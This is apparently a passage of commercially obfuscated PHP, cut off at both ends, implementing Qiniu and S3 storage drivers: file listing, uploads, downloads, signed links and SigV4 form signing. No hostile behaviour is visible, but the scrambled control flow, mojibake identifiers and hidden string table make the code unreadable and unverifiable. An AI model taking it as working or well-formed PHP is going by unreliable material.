c¢¯µô©à : $D•†°Ã½Çè = $bÚâíçí˜á = 0; while (!0) { check_abort(); list($FâíÂ’’Æ…, $d’Â‘í) = $this->bucketManager->listFiles($this->bucket, $Bˆºè”øã», $b½¢‚Íê©, $a¿¯Ô•ÉÒï, $a‘Â­‡¥à); if ($d’Â‘í) { break; } $b½¢‚Íê© = array_key_exists($aˆß²ğ•îÁ[1224], $FâíÂ’’Æ…) ? $b½¢‚Íê© = $FâíÂ’’Æ…[$aˆß²ğ•îÁ[1256]] : $aˆß²ğ•îÁ[33]; if ($A¶ÎˆÀ‘î) { if (!empty($FâíÂ’’Æ…[$aˆß²ğ•îÁ[1257]])) { $D•†°Ã½Çè += count($FâíÂ’’Æ…[$aˆß²ğ•îÁ[1257]]); } if (!empty($FâíÂ’’Æ…[$aˆß²ğ•îÁ[1258]])) { $bÚâíçí˜á += count($FâíÂ’’Æ…[$aˆß²ğ•îÁ[1258]]); } if ($b½¢‚Íê© === $aˆß²ğ•îÁ[33]) { break; } continue; } if ($f¸Ã ¥š·¯) { if (!empty($FâíÂ’’Æ…[$aˆß²ğ•îÁ[1257]])) { return !0; } } else { if (!empty($FâíÂ’’Æ…[$aˆß²ğ•îÁ[1258]])) { return !0; } } if ($b½¢‚Íê© === $aˆß²ğ•îÁ[33]) { break; } } if ($A¶ÎˆÀ‘î) { return array($aˆß²ğ•îÁ[201] => $D•†°Ã½Çè, $aˆß²ğ•îÁ[202] => $bÚâíçí˜á); } goto eº¼œ÷Ş ; eº¼œ÷Ş : return !1; goto F‚Ï†Ø¾»Š; F‚Ï†Ø¾»Š: } public function listAll($d¬•±Ò‡Ì) { $f•×ÃÁë« =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c–ªæ†ˆ = $this->fileList($d¬•±Ò‡Ì, $f•×ÃÁë«[33], !0); $A¼’Ğ¤õ±Ğ = array(); foreach ($c–ªæ†ˆ[$f•×ÃÁë«[73]] as $DÉ³†ŸæÚÂ) { $A¼’Ğ¤õ±Ğ[$DÉ³†ŸæÚÂ[$f•×ÃÁë«[92]]] = $DÉ³†ŸæÚÂ[$f•×ÃÁë«[77]]; } foreach ($c–ªæ†ˆ[$f•×ÃÁë«[74]] as $DÉ³†ŸæÚÂ) { if (is_string($DÉ³†ŸæÚÂ)) { $A¼’Ğ¤õ±Ğ[$DÉ³†ŸæÚÂ] = 0; } } return $this->listAllFiles($d¬•±Ò‡Ì, array_keys($A¼’Ğ¤õ±Ğ), $A¼’Ğ¤õ±Ğ); } private function fileList($EŸ¬­¥Â´Ñ, $e´¾ĞªÔ³ = '', $eôÛÍ‘ò¾ù = 0) { goto c‡ÕŠ¡†İ; c‡ÕŠ¡†İ: $eæ‚ßí£Ù =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EŸ¬­¥Â´Ñ = trim($EŸ¬­¥Â´Ñ, $eæ‚ßí£Ù[8]); $fŒ†¼Ø“ˆç = empty($EŸ¬­¥Â´Ñ) ? $eæ‚ßí£Ù[33] : $EŸ¬­¥Â´Ñ . $eæ‚ßí£Ù[8]; goto e‘¢ÕšæÙ…; e‘¢ÕšæÙ…: $CÙ†Ó—‚â¡ = $eæ‚ßí£Ù[33]; $câ·Í¹£ = 1000; $CÌµõ³ÄÛ¹ = $this->listItemCache === !1 ? !1 : !0; goto AÎÍŸÖ÷§; fÀó«Åäğ³: return array($eæ‚ßí£Ù[74] => $D®ˆ¨˜ĞÖÆ, $eæ‚ßí£Ù[73] => $C¿òÃö¾ëŒ); goto BÁïœ††©Ô; AÎÍŸÖ÷§: $D®ˆ¨˜ĞÖÆ = $C¿òÃö¾ëŒ = array(); while (!0) { check_abort(); list($fÃ„¨®Í¦¼, $e½ĞÒÈ›Õ“) = $this->bucketManager->listFiles($this->bucket, $fŒ†¼Ø“ˆç, $CÙ†Ó—‚â¡, $câ·Í¹£, $e´¾ĞªÔ³); if ($e½ĞÒÈ›Õ“) { break; } $CÙ†Ó—‚â¡ = array_key_exists($eæ‚ßí£Ù[1224], $fÃ„¨®Í¦¼) ? $CÙ†Ó—‚â¡ = $fÃ„¨®Í¦¼[$eæ‚ßí£Ù[1256]] : $eæ‚ßí£Ù[33]; $f®‘“„¥¦œ = isset($fÃ„¨®Í¦¼[$eæ‚ßí£Ù[1257]]) ? $fÃ„¨®Í¦¼[$eæ‚ßí£Ù[1257]] : array(); $FÍ·‡Í¯…® = isset($fÃ„¨®Í¦¼[$eæ‚ßí£Ù[1258]]) ? $fÃ„¨®Í¦¼[$eæ‚ßí£Ù[1258]] : array(); foreach ($f®‘“„¥¦œ as $cÇ–¤ô³Íõ) { goto bÏÒ¨Š×¨¯; bÏÒ¨Š×¨¯: if ($cÇ–¤ô³Íõ[$eæ‚ßí£Ù[92]] == $fŒ†¼Ø“ˆç) { continue; } $fËå¥†ÖšØ = $cÇ–¤ô³Íõ[$eæ‚ßí£Ù[92]]; $d‡ìï²Œ—Ú = $cÇ–¤ô³Íõ[$eæ‚ßí£Ù[1254]]; goto eñ‚‘ÇÙˆÈ; DİôóÔµ¾â: if ($fó´Ôšó÷Ü) { $D®ˆ¨˜ĞÖÆ[] = $fËå¥†ÖšØ; continue; } $C¿òÃö¾ëŒ[] = $eôÛÍ‘ò¾ù ? $cÇ–¤ô³Íõ : $fËå¥†ÖšØ; goto aËÉ‡çìÀò; eñ‚‘ÇÙˆÈ: $cÇ–¤ô³Íõ[$eæ‚ßí£Ù[77]] = $d‡ìï²Œ—Ú; $fó´Ôšó÷Ü = $d‡ìï²Œ—Ú == 0 && substr($fËå¥†ÖšØ, strlen($fËå¥†ÖšØ) - 1, 1) == $eæ‚ßí£Ù[8] ? !0 : !1; if ($CÌµõ³ÄÛ¹) { $this->cacheMethod($eæ‚ßí£Ù[197], $fËå¥†ÖšØ, $fó´Ôšó÷Ü); $this->cacheMethod($eæ‚ßí£Ù[198], $fËå¥†ÖšØ, $cÇ–¤ô³Íõ); } goto DİôóÔµ¾â; aËÉ‡çìÀò: } foreach ($FÍ·‡Í¯…® as $fËå¥†ÖšØ) { if ($fËå¥†ÖšØ == $fŒ†¼Ø“ˆç) { continue; } $D®ˆ¨˜ĞÖÆ[] = $fËå¥†ÖšØ; if ($CÌµõ³ÄÛ¹) { $this->cacheMethod($eæ‚ßí£Ù[197], $fËå¥†ÖšØ, !0); } } if ($CÙ†Ó—‚â¡ === $eæ‚ßí£Ù[33]) { break; } } if ($CÌµõ³ÄÛ¹) { $this->cacheMethod($eæ‚ßí£Ù[197], $EŸ¬­¥Â´Ñ, !0); } goto fÀó«Åäğ³; BÁïœ††©Ô: } public function canRead($c™©Ş›Á£„) { return $this->exist($c™©Ş›Á£„) ? !0 : !1; } public function canWrite($aè¢õå†¼Ğ) { return $this->exist($aè¢õå†¼Ğ) ? !0 : !1; } public function getContent($A³ë¯™øØ) { return $this->fileSubstr($A³ë¯™øØ, 0, -1); } public function setContent($DòÖš½«°², $Bˆøøø»¿œ = '') { $cÜçËùìÔÖ = $this->tempFile($this->pathThis($DòÖš½«°²)); file_put_contents($cÜçËùìÔÖ, $Bˆøøø»¿œ); if ($this->upload($DòÖš½«°², $cÜçËùìÔÖ)) { $this->tempFileRemve($cÜçËùìÔÖ); return !0; } return !1; } public function refreshUrls($Bò°¬Ûƒ ) { goto e‹»ËÜ¡å”; bÔˆãòÌ¾: return $Aé×‰­ñÑÉ[$FƒÁ¸œÔÓÕ[1029]] == $FƒÁ¸œÔÓÕ[690] ? !0 : !1; goto bä¹ùÇóäµ; D´¬È¬âˆÙ: $DÉœ„Åà¢· = new Qiniu\Cdn\CdnManager($this->auth); list($Aé×‰­ñÑÉ, $C®¶Öğ¶Å¬) = $DÉœ„Åà¢·->refreshUrls($D˜”â•Ã¾½); if ($C®¶Öğ¶Å¬) { return !1; } goto bÔˆãòÌ¾; e‹»ËÜ¡å”: $FƒÁ¸œÔÓÕ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D˜”â•Ã¾½ = array(); if (is_array($Bò°¬Ûƒ )) { foreach ($Bò°¬Ûƒ  as $FÂˆ¥ÎáŞè) { $D˜”â•Ã¾½[] = $this->link($FÂˆ¥ÎáŞè); } } else { $D˜”â•Ã¾½[] = $this->link($Bò°¬Ûƒ ); } goto D´¬È¬âˆÙ; bä¹ùÇóäµ: } public function fileSubstr($DÙÔ¾‡´„, $b± ˆÚ‹ÏÚ, $DÏ½Ã£º›í) { $d…Òë†¯á =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!($b´¶¼š³¦¯ = $this->link($DÙÔ¾‡´„))) { return !1; } $AªÆã ºŠ = !1; if ($DÏ½Ã£º›í > 0) { $DÜß†á¶‰‚ = $b± ˆÚ‹ÏÚ + $DÏ½Ã£º›í - 1; $AªÆã ºŠ = array($d…Òë†¯á[1259] . $b± ˆÚ‹ÏÚ . $d…Òë†¯á[429] . $DÜß†á¶‰‚); } $e‰¢öò‘© = url_request($b´¶¼š³¦¯, $d…Òë†¯á[226], !1, $AªÆã ºŠ); return $e‰¢öò‘©[$d…Òë†¯á[683]] ? $e‰¢öò‘©[$d…Òë†¯á[1039]] : !1; } public function upload($A»²ó•¯šê, $EéçÏ„¸, $B­µÖˆéÁ = false, $d¿ßæªøé‡ = REPEAT_REPLACE) { $f¬——é¸ù½ = new Qiniu\Storage\UploadManager(); $Cªİ–ÁÖ’î = $this->auth->uploadToken($this->bucket, $A»²ó•¯šê); $EÜ«äÏ…ğ’ = get_file_mime(get_path_ext($EéçÏ„¸)); list($E¨ŠÕ­ğóñ, $eöÌõ¡äÈ) = $f¬——é¸ù½->putFile($Cªİ–ÁÖ’î, $A»²ó•¯šê, $EéçÏ„¸, null, $EÜ«äÏ…ğ’); return $eöÌõ¡äÈ ? !1 : $this->getPathOuter($A»²ó•¯šê); } public function uploadFormData($A¨áŒ¬­÷´, $cÎÁ’¸™ = 3600) { return $this->uploadToken($A¨áŒ¬­÷´, $cÎÁ’¸™); } public function multiUploadFormData($eáìÂ©æ, $AÎî†Ô°“‘ = 3600) { return $this->uploadToken($eáìÂ©æ, $AÎî†Ô°“‘); } private function uploadToken($BÂÎİ”•, $A¶‡ÎŠÑéñ = 3600) { goto e•í†å•ï; aæ£Ï¥Ì‚: $Cƒ¬¼œò…È = http_type() . "\72\57\57\165\160\154\157\141\144{$cø°‚ĞùÜ}\56\x71\151\156\x69\x75\160\x2e\143\x6f\155\x2f"; return array($d“†Áä¨ñÎ[1263] => $ešî‚ˆÛëš, $d“†Áä¨ñÎ[1264] => $Cƒ¬¼œò…È); goto Aõ‰³Ø‚¥; FÄƒ•âŠÔè: $a¬ÕÚÉ¥ä† = $BÂÎİ”•; $ešî‚ˆÛëš = $this->auth->uploadToken($this->bucket, $a¬ÕÚÉ¥ä†, $Dªè¼Åˆòò, $E‰ºË‘‘¬‡, !0); $cø°‚ĞùÜ = empty($this->region) || $this->region == $d“†Áä¨ñÎ[1262] ? $d“†Áä¨ñÎ[33] : $d“†Áä¨ñÎ[429] . $this->region; goto aæ£Ï¥Ì‚; e•í†å•ï: $d“†Áä¨ñÎ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Dªè¼Åˆòò = $A¶‡ÎŠÑéñ; $E‰ºË‘‘¬‡ = array($d“†Áä¨ñÎ[1260] => $d“†Áä¨ñÎ[1261]); goto FÄƒ•âŠÔè; Aõ‰³Ø‚¥: } public function download($c·‹šÆÔÄ, $c¾Û‰à×¨ï) { goto A‡ŒÙùïÅŸ; C¯à—ò‡‹: fclose($bÚ×ˆËê—¸); return $c¾Û‰à×¨ï; goto F·Ú‹‘Õ; CäÈ˜Øø†ƒ: $E¬¯¢ÑŸÇ¦ = 1024 * 200; $bÚ×ˆËê—¸ = fopen($c÷Õ†ê–¶Ô, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1265]); while (!0) { $aŠ½…”Õ©“ = $this->fileSubstr($c·‹šÆÔÄ, $dò¤•ÉìĞ“, $E¬¯¢ÑŸÇ¦); if ($aŠ½…”Õ©“ === !1) { return !1; } fwrite($bÚ×ˆËê—¸, $aŠ½…”Õ©“); $dò¤•ÉìĞ“ += $E¬¯¢ÑŸÇ¦; if (strlen($aŠ½…”Õ©“) < $E¬¯¢ÑŸÇ¦) { break; } } goto C¯à—ò‡‹; A‡ŒÙùïÅŸ: $c÷Õ†ê–¶Ô = IO::getPathInner(IO::mkfile($c¾Û‰à×¨ï)); if (!($e‚Æ¦‚íÁ® = $this->link($c·‹šÆÔÄ))) { return !1; } $dò¤•ÉìĞ“ = 0; goto CäÈ˜Øø†ƒ; F·Ú‹‘Õ: } public function link($C‡Ç£‡…‡, $A÷÷ ®Ş” = '') { if (!$this->isFile($C‡Ç£‡…‡)) { return !1; } $FŠ¨¬’Ø¶ = $this->getHost() . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][8] . $this->pathEncode($C‡Ç£‡…‡) . $A÷÷ ®Ş”; return $this->auth->privateDownloadUrl($FŠ¨¬’Ø¶, 3600 * 12); } public function fileOut($aÉœØâ¸Ùá, $fŸáÂ·‹”â = false, $FŒ·±«‘£— = false, $C¦¯ö¢ğã“ = '') { $Fä÷¶Éí‰„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($this->isFileOutServer()) { return $this->fileOutServer($aÉœØâ¸Ùá, $fŸáÂ·‹”â, $FŒ·±«‘£—, $C¦¯ö¢ğã“); } if (!$FŒ·±«‘£—) { $FŒ·±«‘£— = $this->pathThis($aÉœØâ¸Ùá); } $Bì°•º Ëñ = $fŸáÂ·‹”â ? $Fä÷¶Éí‰„[1266] . rawurlencode($FŒ·±«‘£—) : $Fä÷¶Éí‰„[33]; $bÈŒ…Ùã¹ = $this->link($aÉœØâ¸Ùá, $Bì°•º Ëñ); $this->fileOutLink($bÈŒ…Ùã¹); } public function fileOutServer($bÇË†¹Ëğî, $eìö²Šæ« = false, $B¸ÔßÅ¾ÖÚ = false, $bÅÄËµ¬Ï = '') { parent::fileOut($bÇË†¹Ëğî, $eìö²Šæ«, $B¸ÔßÅ¾ÖÚ, $bÅÄËµ¬Ï); } public function fileOutImage($B†•ø¥ˆ”’, $BèºÊ³†Ó´ = 250) { $B¨ÉˆŞÈé™ = $this->link($B†•ø¥ˆ”’, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1267] . $BèºÊ³†Ó´); $this->fileOutLink($B¨ÉˆŞÈé™); } public function fileOutImageServer($bÛÓ»«í‡™, $cÕÍÉáÉù­ = 250) { parent::fileOutImage($bÛÓ»«í‡™, $cÕÍÉáÉù­); } public function hashMd5($C´ä¼£µë±) { $CæôÂÉé§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aØñƒŒ½ì = $this->objectMeta($C´ä¼£µë±); return isset($aØñƒŒ½ì[$CæôÂÉé§[206]]) ? $aØñƒŒ½ì[$CæôÂÉé§[206]] : !1; $E˜ÁŠÙôà” = $this->link($C´ä¼£µë±, $CæôÂÉé§[1268]); } public function size($cÑ£­†¢ªÃ) { $eäœ÷¥è£ = $this->objectMeta($cÑ£­†¢ªÃ); return $eäœ÷¥è£ ? $eäœ÷¥è£[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]] : 0; } public function info($B¸º—Å÷Ãë) { if ($this->isFolder($B¸º—Å÷Ãë)) { return $this->folderInfo($B¸º—Å÷Ãë); } else { if ($this->isFile($B¸º—Å÷Ãë)) { return $this->fileInfo($B¸º—Å÷Ãë); } } return !1; } public function exist($fÊÕóİÂƒö) { return $this->isFile($fÊÕóİÂƒö) || $this->isFolder($fÊÕóİÂƒö); } public function isFile($FŞº±Ìá…Š) { return !$this->isFolder($FŞº±Ìá…Š) && $this->objectMeta($FŞº±Ìá…Š); } public function isFolder($CÙÄ†¾‹Ğò) { return $this->cacheMethod($_SERVER[ó¬â¥‰ÊÔ¤Ç£][197], $CÙÄ†¾‹Ğò); } protected function objectMeta($D‰øÎ²Òç) { return $this->cacheMethod($_SERVER[ó¬â¥‰ÊÔ¤Ç£][198], $D‰øÎ²Òç); } protected function _objectMeta($dãÈ”¾é°ğ) { $F›’¼ˆÏõ¤ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; list($E‘˜‹ ˜’Š, $AŒõ“êø‚¦) = $this->bucketManager->stat($this->bucket, $dãÈ”¾é°ğ); if ($E‘˜‹ ˜’Š) { $E‘˜‹ ˜’Š[$F›’¼ˆÏõ¤[77]] = intval($E‘˜‹ ˜’Š[$F›’¼ˆÏõ¤[1254]]); } return $E‘˜‹ ˜’Š; } protected function _isFolder($F²ªŒêí’¹) { $F¤¬ëÍà½ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($F²ªŒêí’¹ == $F¤¬ëÍà½[33] || $F²ªŒêí’¹ == $F¤¬ëÍà½[8]) { return !0; } list($e˜â´Á¼¼, $a²´ÌÌà•µ) = $this->bucketManager->listFiles($this->bucket, trim($F²ªŒêí’¹, $F¤¬ëÍà½[8]) . $F¤¬ëÍà½[8], $F¤¬ëÍà½[33], 1, $F¤¬ëÍà½[8]); return !empty($e˜â´Á¼¼[$F¤¬ëÍà½[1257]]) || !empty($e˜â´Á¼¼[$F¤¬ëÍà½[1258]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Cù†éçï‹) { parent::__construct($Cù†éçï‹); } public function uploadFormData($EÆ‰˜Ò± Û, $eŸ­•˜®•µ = 3600) { goto C¢ëÂé¶Ã‰; E•«‰ÚŞŒÄ: $B©¬´Ùİ¸š = array($this->accessKey, $d„ö×ÚÈ·±, $this->region, $b«¾ö¬Ú¨, $cçœ÷Î˜·); $c§ƒéÎ½¢š = implode($eãïïò”«ƒ[8], $B©¬´Ùİ¸š); $C¦ïº×±Ş§ = array($eãïïò”«ƒ[1139] => gmdate($eãïïò”«ƒ[1138], strtotime($eãïïò”«ƒ[1177])), $eãïïò”«ƒ[1140] => array(array($eãïïò”«ƒ[1142] => $this->bucket), array($eãïïò”«ƒ[1141] => $d³è “Ú¡), array($eãïïò”«ƒ[1143], $eãïïò”«ƒ[1144], $eãïïò”«ƒ[33]), array($eãïïò”«ƒ[1143], $eãïïò”«ƒ[1178], $eãïïò”«ƒ[33]), array($eãïïò”«ƒ[1143], $eãïïò”«ƒ[1179], $eãïïò”«ƒ[33]), array($eãïïò”«ƒ[1145] => $FÎÉİšøË), array($eãïïò”«ƒ[1180] => $c§ƒéÎ½¢š), array($eãïïò”«ƒ[1181] => $f¯µÎ¬øóÂ), array($eãïïò”«ƒ[1182] => $DÕª±İğŠ„), array($eãïïò”«ƒ[1183] => $cÌ½ŒĞŸñ’))); goto d–Ğì˜Êê½; d–Ğì˜Êê½: $fÌÈˆ§¯®ê = base64_encode(json_encode($C¦ïº×±Ş§)); $DÙ²ŒŞåĞ³ = hash_hmac($eãïïò”«ƒ[1184], $d„ö×ÚÈ·±, $eãïïò”«ƒ[1185] . $this->secret, !0); $e…Ëß¢¾£ = hash_hmac($eãïïò”«ƒ[1184], $this->region, $DÙ²ŒŞåĞ³, !0); goto f³ÀèÂä; f³ÀèÂä: $EÛ¦¥â“Ö = hash_hmac($eãïïò”«ƒ[1184], $b«¾ö¬Ú¨, $e…Ëß¢¾£, !0); $D ¬Æ¤Ó® = hash_hmac($eãïïò”«ƒ[1184], $cçœ÷Î˜·, $EÛ¦¥â“Ö, !0); $eÁ„õ±ÇÏ¥ = hash_hmac($eãïïò”«ƒ[1184], $fÌÈˆ§¯®ê, $D ¬Æ¤Ó®); goto F³‡âÀçìƒ; a¼Ô‰›£°: $cçœ÷Î˜· = $eãïïò”«ƒ[1176]; $cÌ½ŒĞŸñ’ = $eŸ­•˜®•µ . $eãïïò”«ƒ[33]; $FÎÉİšøË = $eãïïò”«ƒ[1137]; goto E•«‰ÚŞŒÄ; dì°§°¾¢Ù: $b«¾ö¬Ú¨ = $eãïïò”«ƒ[59]; $DÕª±İğŠ„ = gmdate($eãïïò”«ƒ[1175]); $d„ö×ÚÈ·± = gmdate($eãïïò”«ƒ[684]); goto a¼Ô‰›£°; F³‡âÀçìƒ: $AÍòâËŠİÌ = array($eãïïò”«ƒ[209] => $eãïïò”«ƒ[33], $eãïïò”«ƒ[1186] => $eãïïò”«ƒ[33], $eãïïò”«ƒ[1141] => $d³è “Ú¡, $eãïïò”«ƒ[1145] => $FÎÉİšøË, $eãïïò”«ƒ[1149] => $fÌÈˆ§¯®ê, $eãïïò”«ƒ[1187] => $c§ƒéÎ½¢š, $eãïïò”«ƒ[1188] => $f¯µÎ¬øóÂ, $eãïïò”«ƒ[1189] => $DÕª±İğŠ„, $eãïïò”«ƒ[1190] => $cÌ½ŒĞŸñ’, $eãïïò”«ƒ[1191] => $eÁ„õ±ÇÏ¥, $eãïïò”«ƒ[175] => $this->getHost()); return $AÍòâËŠİÌ; goto Aá‰ø¤çé›; C¢ëÂé¶Ã‰: $eãïïò”«ƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d³è “Ú¡ = $eãïïò”«ƒ[191]; $f¯µÎ¬øóÂ = $eãïïò”«ƒ[1174]; goto dì°§°¾¢Ù; Aá‰ø¤çé›: } public function multiUploadFormData($eÏ°Å›öÓá, $DÍåãÆà = 3600) { $E°Û×”ÅÚó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fè‡Æ‘Ñ™ = gmdate($E°Û×”ÅÚó[1269]); $D¨Û«¶…™ˆ = array(); $d‹š³µ¨µÜ = $this->client->getUploadId($this->bucket, $eÏ°Å›öÓá, $D¨Û«¶…™ˆ); if (!$d‹š³µ¨µÜ) { return !1; } return array($E°Û×”ÅÚó[219] => $d‹š³µ¨µÜ, $E°Û×”ÅÚó[175] => $this->getHost() . $E°Û×”ÅÚó[8] . $this->pathEncode($eÏ°Å›öÓá), $E°Û×”ÅÚó[220] => $fè‡Æ‘Ñ™, $E°Û×”ÅÚó[92] => $eÏ°Å›öÓá); } public function multiUploadAuthData($aãÈº±ø‹Å, $eô„Å¿¤í = array()) { goto FÛ¢´Îïí; Aµ×®ªå¤: if (isset($eô„Å¿¤í[$aÖÜâî¯½¹[1270]])) { $d·«¾—¥íØ[$aÖÜâî¯½¹[1271]] = $eô„Å¿¤í[$aÖÜâî¯½¹[1270]]; } $d²¸—µ¾è’ = explode($aÖÜâî¯½¹[177], $this->getHost()); $A¹«ˆÇ–¢ = array($aÖÜâî¯½¹[1272] => $d²¸—µ¾è’[1], $aÖÜâî¯½¹[1273] => $aÖÜâî¯½¹[33], $aÖÜâî¯½¹[209] => $aÖÜâî¯½¹[118], $aÖÜâî¯½¹[1186] => $eô„Å¿¤í[$aÖÜâî¯½¹[77]]); goto BÛ¦¬ìŞ; dî„îÆÚ‡‚: if (strpos($fÉ¸É»óä, $aÖÜâî¯½¹[223]) === 0) { if (isset($d·«¾—¥íØ[$aÖÜâî¯½¹[1271]])) { $dï¦¹†ÁÒˆ = $d·«¾—¥íØ[$aÖÜâî¯½¹[1271]]; } else { if (isset($cÉÂÚÔŞ†¶[$aÖÜâî¯½¹[1271]])) { $dï¦¹†ÁÒˆ = $cÉÂÚÔŞ†¶[$aÖÜâî¯½¹[1271]]; } else { $dï¦¹†ÁÒˆ = hash($aÖÜâî¯½¹[1184], $aÖÜâî¯½¹[33]); } } return array($aÖÜâî¯½¹[230] => $cÉÂÚÔŞ†¶[$aÖÜâî¯½¹[230]], $aÖÜâî¯½¹[1271] => $dï¦¹†ÁÒˆ, $aÖÜâî¯½¹[220] => $cÉÂÚÔŞ†¶[$aÖÜâî¯½¹[1274]]); } return $cÉÂÚÔŞ†¶[$aÖÜâî¯½¹[230]]; goto Có…å‘¯›¿; E«ë÷ëÎßÓ: unset($eô„Å¿¤í[$aÖÜâî¯½¹[92]]); if (isset($eô„Å¿¤í[$aÖÜâî¯½¹[221]])) { return $this->listUploadParts($dßÅõ‹Ÿõ¦, $eô„Å¿¤í); } $d·«¾—¥íØ = array(); goto Aµ×®ªå¤; BÛ¦¬ìŞ: $aùˆ“ò±Ã‹ = $aÖÜâî¯½¹[224]; $b•›¥«Ô×• = $aÖÜâî¯½¹[8] . $this->pathEncode($dßÅõ‹Ÿõ¦) . $fÉ¸É»óä; $cÉÂÚÔŞ†¶ = $this->client->__getSignatureV4($d·«¾—¥íØ, $A¹«ˆÇ–¢, $aùˆ“ò±Ã‹, $b•›¥«Ô×•); goto dî„îÆÚ‡‚; FÛ¢´Îïí: $aÖÜâî¯½¹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fÉ¸É»óä = isset($eô„Å¿¤í[$aÖÜâî¯½¹[167]]) ? $eô„Å¿¤í[$aÖÜâî¯½¹[167]] : $aÖÜâî¯½¹[33]; $dßÅõ‹Ÿõ¦ = $eô„Å¿¤í[$aÖÜâî¯½¹[92]]; goto E«ë÷ëÎßÓ; Có…å‘¯›¿: } public function listUploadParts($Aò—ŒÓÑ°, $b…´°¼·ÅÆ = array()) { goto A°Í±ÙÅå; eäÙí¨Æàâ: $dÅ”Û–ªô = array($bÄÇùÉÙãÜ[1272] => $B‡ç¦¯Êë[1], $bÄÇùÉÙãÜ[209] => $bÄÇùÉÙãÜ[118], $bÄÇùÉÙãÜ[1186] => strlen($Dë—³–Â¶)); $Fìá«ñÚ˜Í = $bÄÇùÉÙãÜ[222]; $FªÉğ¼È = $bÄÇùÉÙãÜ[8] . $this->pathEncode($Aò—ŒÓÑ°) . $b…´°¼·ÅÆ[$bÄÇùÉÙãÜ[167]]; goto C­´‘¬½Èˆ; E‹†”éØÈ¡: $Dë—³–Â¶ .= $bÄÇùÉÙãÜ[1278]; $CôÍƒÉœˆ‰ = array(); $B‡ç¦¯Êë = explode($bÄÇùÉÙãÜ[177], $this->getHost()); goto eäÙí¨Æàâ; cÃèéŞÛã: if (!$f¼ò’ÔÙ·Ï) { return !1; } $Dë—³–Â¶ = $bÄÇùÉÙãÜ[1275]; foreach ($f¼ò’ÔÙ·Ï as $FÛ¨«…ØÛ) { $Dë—³–Â¶ .= $bÄÇùÉÙãÜ[1276] . "\74\120\141\162\164\116\x75\x6d\142\x65\x72\76{$FÛ¨«…ØÛ[$bÄÇùÉÙãÜ[1231]]}\74\x2f\120\x61\162\x74\x4e\165\x6d\x62\145\162\x3e\12" . "\x3c\105\x54\x61\x67\x3e{$FÛ¨«…ØÛ[$bÄÇùÉÙãÜ[1232]]}\74\57\x45\124\141\x67\76\xa" . $bÄÇùÉÙãÜ[1277]; } goto E‹†”éØÈ¡; A°Í±ÙÅå: $bÄÇùÉÙãÜ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CË­Š»‚“Ë = str_replace($bÄÇùÉÙãÜ[231], $bÄÇùÉÙãÜ[33], $b…´°¼·ÅÆ[$bÄÇùÉÙãÜ[167]]); $f¼ò’ÔÙ·Ï = $this->client->listParts($this->bucket, $Aò—ŒÓÑ°, $CË­Š»‚“Ë); goto cÃèéŞÛã; C­´‘¬½Èˆ: $a¢Ì»šŠ = $this->client->__getSignatureV4($CôÍƒÉœˆ‰, $dÅ”Û–ªô, $Fìá«ñÚ˜Í, $FªÉğ¼È, $Dë—³–Â¶); return array($bÄÇùÉÙãÜ[230] => $a¢Ì»šŠ[$bÄÇùÉÙãÜ[230]], $bÄÇùÉÙãÜ[220] => $a¢Ì»šŠ[$bÄÇùÉÙãÜ[1274]], $bÄÇùÉÙãÜ[232] => $f¼ò’ÔÙ·Ï, $bÄÇùÉÙãÜ[1271] => $a¢Ì»šŠ[$bÄÇùÉÙãÜ[1271]]); goto D«ï–ãµòÇ; D«ï–ãµòÇ: } public function link($b·—¼·Á¹ï, $d”ŒÈÙÔË = array()) { return parent::link($b·—¼·Á¹ï, $d”ŒÈÙÔË); } public function fileOut($aãƒ¿¾‚²Š, $f´ØœÙ—ç± = false, $fª–Ø“ = false, $eÙæé¤é©“ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1279])) { return parent::fileOutServer($aãƒ¿¾‚²Š, $f´ØœÙ—ç±, $fª–Ø“, $eÙæé¤é©“); } parent::fileOut($aãƒ¿¾‚²Š, $f´ØœÙ—ç±, $fª–Ø“, $eÙæé¤é©“); } public function fileOutImage($CŸÓÓí‹¾, $F§ƒ±‚­ˆ– = 250) { if (strstr($this->endpoint, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1279])) { return parent::fileOutImageServer($CŸÓÓí‹¾, $F§ƒ±‚­ˆ–); } parent::fileOutImage($CŸÓÓí‹¾, $F§ƒ±‚­ˆ–); } public function fileOutLink($d â…÷ºÒÚ) { $b«ŒŠ…‘˜¾ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (substr($d â…÷ºÒÚ, 0, 7) == $b«ŒŠ…‘˜¾[1152]) { $d â…÷ºÒÚ = $b«ŒŠ…‘˜¾[1153] . substr($d â…÷ºÒÚ, 7); } header($b«ŒŠ…‘˜¾[158] . $d â…÷ºÒÚ); die; } public function getHost() { $dŒÇÏ’µº” =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EŞßâ¢ƒÊ = str_rtrim(parent::getHost(), $dŒÇÏ’µº”[8] . $this->bucket); $EŞßâ¢ƒÊ = explode($dŒÇÏ’µº”[177], $EŞßâ¢ƒÊ); return $EŞßâ¢ƒÊ[0] . $dŒÇÏ’µº”[177] . $this->bucket . $dŒÇÏ’µº”[94] . $EŞßâ¢ƒÊ[1]; } } goto D–ºŸÛ±”; cà†Å¿÷Ç: $dˆ©‹‘‡¶¹ = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][563]; $_SERVER[‰†ğ°] = explode($_SERVER[ó¬â¥‰ÊÔ¤Ç£][564], 